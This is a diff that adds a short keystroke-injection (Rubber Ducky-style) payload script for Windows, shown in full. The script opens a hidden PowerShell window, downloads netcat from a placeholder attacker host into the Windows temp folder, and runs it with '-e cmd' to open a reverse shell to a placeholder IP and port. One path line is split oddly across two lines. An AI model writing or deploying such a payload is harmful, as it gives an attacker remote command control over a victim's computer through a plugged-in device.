@@ -1,0 +1,13 @@
+DELAY 600
+GUI r
+DELAY 600
+STRING powershell -W hidden
+ENTER
+DELAY 1100
+ENTER
+STRING Invoke-WebRequest http://ip/nc.exe -outfile c:
+\windows\temp\nc.exe
+ENTER
+DELAY 1100
+STRING c:\windows\temp\nc.exe ip port -e cmd
+ENTER
